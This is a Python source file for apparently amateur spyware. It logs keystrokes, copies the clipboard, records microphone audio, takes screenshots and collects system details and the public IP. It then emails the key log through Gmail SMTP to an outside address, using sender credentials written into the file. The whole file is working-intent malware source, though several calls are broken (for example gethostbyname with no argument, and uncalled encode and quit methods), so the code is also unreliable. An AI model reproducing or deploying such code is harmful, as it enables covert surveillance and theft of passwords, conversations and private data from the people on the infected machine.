from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from multiprocessing.util import is_abstract_socket_namespace
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import process,freeze_support
from PIL import ImageGrab

keys_information="key_log.txt"
system_information="systeminfo.txt"
clipboard_information="clipboard.txt"
microphone_time= 10
audio_info="audio.wav"
ss_info="screenshot.png"




email_address = "pycheckkeyl@gmail.com"
password="#Password123"
toaddr = "lowdee1234@gmail.com"


file_path="C:\\Users\\Admin\\Downloads\\New folder\\pyproj.py"
extend = "\\"

def send_email(filename,attachment,toaddr):
    fromaddr = email_address    

    msg=MIMEMultipart()
    msg['From']= fromaddr
    msg['To']= toaddr
    msg['Subject']= "Log File"
    body = "Body_of_the_mail"

    msg.attach(MIMEText(body,'plain'))

    filename=filename
    attachment=open(attachment,'rb')

    pqr= MIMEBase('application','octet-stream')
    pqr.set_payload((attachment).read())
    encoders.encode_base64

    pqr.add_header('Content-Disposition',"attachment; filename=%s"%filename)
    msg.attach(pqr)

    s=smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)

    text = msg.as_string()

    s.sendmail(fromaddr,toaddr,text)

    s.quit

send_email(keys_information,file_path+extend+keys_information,toaddr)

def computer_information():
    with open(file_path+extend+system_information,"a") as f:
        hostname= socket.gethostname()
        IPAddr=socket.gethostbyname()
        try:
            public_ip=get("https://api.ipify.org").text
            f.write("PUBLIC IP"+public_ip)

        except Exception:
            f.write("Couldn't GET PUBLIC IP")

        f.write("Processor:"+(platform.processor())+'\n')
        f.write("System:"+platform.system()+""+platform.version()+'\n')
        f.write("Machine:"+platform.machine()+"\n")
        f.write("Hostname"+hostname+"\n")
        f.write("Private IP"+IPAddr+"\n")


computer_information()
def copy_clipboard():
    with open(file_path+extend+clipboard_information,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n"+pasted_data)

        except:
            f.write("Clipboard could not be copied")
copy_clipboard()

def microphone():
    mic=44100
    seconds = microphone_time
    myrec=sd.rec(int(seconds*mic), samplerate=mic,channels=2)
    sd.wait()

    write(file_path+extend+audio_info,mic,myrec)
microphone()


def ss():
    im=ImageGrab.grab()
    im.save(file_path+extend+ss_info)

ss()
count=0
keys=[]

def on_press(key):
    global keys,count

    print(key)
    keys.append(key)
    count+=1

def write_file(key):
    with open(file_path+extend+keys_information, "a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space") >0:
                f.write('\n')
                f.close()


def on_release(key):
    if key==Key.esc:
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()


